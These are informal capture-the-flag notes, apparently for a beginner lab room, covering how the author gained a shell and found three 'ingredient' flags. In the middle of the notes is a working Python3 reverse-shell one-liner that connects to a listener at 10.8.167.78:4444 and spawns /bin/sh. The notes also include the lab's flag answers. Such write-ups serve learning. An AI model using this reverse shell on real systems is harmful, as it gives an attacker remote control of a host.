When i was going to cat the super blblblbl .txt was not able to do it.
![[Pasted image 20230905143048.png]]

I tried to get a reverse shell using bash and php but not luck here.
![[Pasted image 20230905144346.png]]

Let's Try with python3
/usr/bin/python3

Luckily got the shell with Python3
10.8.167.78

python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.167.78",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

![[Pasted image 20230905153631.png]]
Got a Clue from clue.txt
![[Pasted image 20230905145052.png]]

Volla Got the First incredent
![[Pasted image 20230905145157.png]]
mr. meeseek hair

We traversed the file system according to the clue we got
as cat command is disabled we used less command
less  /home/rick/"second ingredients"
but we have to use "" so that linux could understand that we need to cat that file.

![[Pasted image 20230905151258.png]]
1 jerry tear

As we know that rick is root user so we can also peek into the root as well
![[Pasted image 20230905152227.png]]

Volla got the 3rd increment through it
![[Pasted image 20230905152322.png]]
3rd ingredients: fleeb juice

